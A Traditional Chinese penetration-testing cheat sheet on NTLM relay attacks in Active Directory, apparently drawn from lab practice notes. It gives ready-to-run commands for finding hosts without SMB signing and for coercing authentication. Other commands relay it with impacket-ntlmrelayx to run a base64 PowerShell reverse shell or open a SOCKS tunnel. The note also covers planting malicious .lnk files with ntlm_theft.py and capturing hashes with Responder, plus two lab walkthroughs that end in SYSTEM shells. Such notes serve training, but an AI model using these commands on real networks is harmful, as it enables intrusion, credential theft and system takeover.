# 💥 NTLM 中間人轉發攻擊 (ntlm-relay)

本文件說明 Windows/Active Directory 環境中 NTLM Relay (NTLM 轉發) 攻擊的原理、檢測方法與利用技巧。

---

## 🔍 漏洞成因與原理

NTLM Relay (NTLM 中間人轉發) 攻擊主要是利用 Windows 網路環境中 **SMB 簽名 (SMB Signing)** 未被強制啟用的缺陷。

當攻擊者能夠誘使網路中的某台主機或某個服務（以高權限如 SYSTEM 或管理員帳號執行）嘗試連線至攻擊者控制的惡意伺服器（例如透過 SMB/HTTP 存取），該主機會嘗試向攻擊者發起 NTLM 挑戰/響應驗證。
此時，攻擊者如果不嘗試直接破解其雜湊值，而是將這個 NTLM 驗證請求「即時轉發」給域內的另一台目標主機。如果該目標主機**沒有強制啟用 SMB 簽名**，它就會接受該轉發的驗證，從而允許攻擊者以該連線帳戶的權限，在目標主機上執行任意指令（如寫入服務、執行 PowerShell 等）。

---

## 🛠️ 常見利用與繞過技巧

### 1. 偵測禁用 SMB 簽名的主機
在攻擊機上使用 `nxc` 或是 `nmap` 掃描內網中未啟用（或非強制強制）SMB 簽名的主機：
```bash
# 使用 nxc 掃描 (結果中會顯示 signing:False 或 True)
nxc smb <subnet>

# 或者使用 nmap 檢測
nmap -p 445 --script smb-security-mode <subnet>
```

### 2. 強迫或誘引目標連線 (Coercion / Triggering)
攻擊者必須誘使目標伺服器發起連線以完成驗證。常見方法包括：
- **Web 應用漏洞利用**：例如在 WordPress 中使用可更改備份路徑的外掛（如 `Backup Migration`），將備份路徑修改為攻擊機的 UNC 路徑：`\\<KALI_IP>\share`。
- **強迫認證協定利用**：利用 `PrinterBug`、`PetitPotam` 或 `ShadowCoerce` 等工具強迫電腦帳戶向攻擊機發起連線。

當目標伺服器與攻擊機進行驗證時，中繼工具會攔截驗證並即時轉發。

---

## 💥 Impacket ntlmrelayx 轉發利用 (ntlmrelayx)
`impacket-ntlmrelayx` 是執行 NTLM 中繼攻擊最核心的工具，它支援多種轉發協議與利用模式，最常見的有以下兩種方式：

### 1. 執行指令提權模式（直接獲取 Shell）
當目標主機（`TARGET_IP`）禁用 SMB 簽名時，可將中繼成功的驗證轉發過去並在目標系統上執行任意系統指令（例如使用 PowerShell 反彈 Shell）：
```bash
# -t 指定目標主機，-c 指定要在目標主機上執行的指令，--no-http-server 關閉 HTTP 監聽以避免衝突
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -e <BASE64_ENCODED_REVERSE_SHELL>"
```

### 2. SOCKS 代理通道模式
如果不直接執行命令，也可以使用 SOCKS 模式。在中繼驗證成功後，會在本地建立一個 SOCKS 代理通道（預設為 1080 連接埠），允許攻擊者後續配合 `proxychains` 與其他工具（如 `secretsdump`、`psexec` 或 `smbclient`）靈活地訪問目標主機資源：
```bash
# -socks 參數開啟本地 SOCKS 服務監聽
impacket-ntlmrelayx -t <TARGET_IP> -smb2support -socks --no-http-server
```

## 💥 LNK 惡意檔案 NTLM 憑證洩漏 (NTLM Theft)
在 Windows 環境中，當攻擊者對某個共享目錄（如 SMB 共享）具有寫入權限時，可以上傳惡意的 `.lnk` 快捷方式檔案。當受害者使用 Windows 檔案總管（Explorer）瀏覽該目錄時，檔案總管的預覽功能會自動解析 `.lnk` 檔案以顯示其圖示，此時系統會自動向 `.lnk` 內指定的惡意 UNC 路徑（例如攻擊機 IP）發起 NTLMv2 身份驗證，從而洩漏該受害者的 NTLMv2 Hash。攻擊者可藉此進行 Hash 離線破解或即時進行 NTLM Relay 中繼攻擊。

### 🛠️ 利用方法
1. **生成惡意 LNK 檔案**：
   使用 [ntlm_theft.py](https://github.com/Greenwolf/ntlm_theft) 生成指定攻擊機 IP 的惡意 `.lnk` 檔案（例如 `clickme.lnk`）：
   ```bash
   python3 ntlm_theft.py -g lnk -s <KALI_IP> -f clickme
   ```
2. **上傳至目標共享目錄**：
   利用擁有寫入權限的憑證，將 `.lnk` 檔案上傳至目標主機的共享資料夾（如 `Apps` 或 `Public`）：
   ```bash
   impacket-smbclient <username>:<password>@<target_ip>
   # 進入具寫入權限的共用資料夾後上傳
   put clickme.lnk
   ```
3. **配合 Responder 獲取 Hash**：
   若僅需獲取 Hash 進行離線破解，可在 Kali 上啟動 `responder` 監聽：
   ```bash
   sudo responder -I tun0 -v
   ```
4. **配合 ntlmrelayx 進行中繼攻擊**：
   詳細中繼攻擊指令與利用模式（如獲取 Shell 或 SOCKS 代理），請參考 [[ntlm-relay#💥 Impacket ntlmrelayx 轉發利用 (ntlmrelayx)|ntlmrelayx 轉發利用]] 標題。

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Beyond]]（在 internalsrv1 上發現已啟用的 `Backup Migration` 插件，且 `MAILSRV1` 禁用了 SMB 簽名。攻擊者於 Kali 啟動 `ntlmrelayx` 連向 `MAILSRV1` 並執行反彈指令。隨後在 internalsrv1 上設定備份儲存路徑為 `\\192.168.45.243\backup`，觸發 internalsrv1 發起 NTLM 連線，Kali 將其成功轉發至 `MAILSRV1`，取得其 SYSTEM 權限 Shell）。
    *   [[Laser]]（利用有寫入權限的 SMB 共享目錄上傳由 `ntlm_theft.py` 產生的惡意 `clickme.lnk` 檔案，當受害者開啟目錄時 Windows 檔案總管會自動解析該 LNK 檔案圖示並向攻擊機發起 NTLM 驗證。攻擊機利用 `ntlmrelayx` 接收連線，並轉發 (Relay) 至禁用了 SMB 簽名的另一台主機 `MS02`，成功在 `ntlmrelayx` 中建立目標主機的 SOCKS 通道，並進一步利用 `secretsdump` 與 `psexec` 接管系統）。
